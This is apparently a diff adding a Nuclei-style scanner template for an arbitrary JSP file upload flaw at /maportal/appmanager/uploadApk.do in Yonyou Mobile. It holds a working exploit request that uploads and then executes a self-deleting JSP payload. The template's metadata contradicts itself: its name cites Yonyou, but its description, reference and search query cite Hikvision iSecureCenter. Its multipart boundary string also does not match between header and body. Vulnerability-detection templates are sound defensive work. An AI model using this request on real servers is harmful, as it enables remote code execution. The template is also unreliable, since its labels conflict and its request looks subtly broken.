@@ -1,0 +1,47 @@
+id: yonyou-uploadApk-fileupload
+
+info:
+  name: Yonyou Mobile - Arbitrary File Upload
+  author: Co5mos
+  severity: critical
+  description: An arbitrary file upload vulnerability in the Hikvision iSecureCenter.
+  reference:
+    - https://github.com/Sweelg/HIKVISION_iSecure_Center-RCE
+  metadata:
+    max-request: 2
+    fofa-query: app="HIKVISION-iSecure-Center"
+  tags: hikvision,fileupload
+
+variables:
+  filename: "{{rand_base(6)}}.jsp"
+
+http:
+  - raw:
+      - |
+        POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type:multipart/form-data;boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
+        Cookie:JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server
+        Connection:close
+
+        ------WebKitFormBoundaryvLTG6zlX0gZ8LzO
+        Content-Disposition:form-data;name="downloadpath";filename="{{filename}}"
+        Content-Type:application/msword
+        
+        <% out.print(1111*2222);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundaryvLTG6zlX0gZ8LzO--
+
+      - |
+        GET /maupload/apk/{{filename}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '246908642'
+
+      - type: status
+        status:
+          - 200
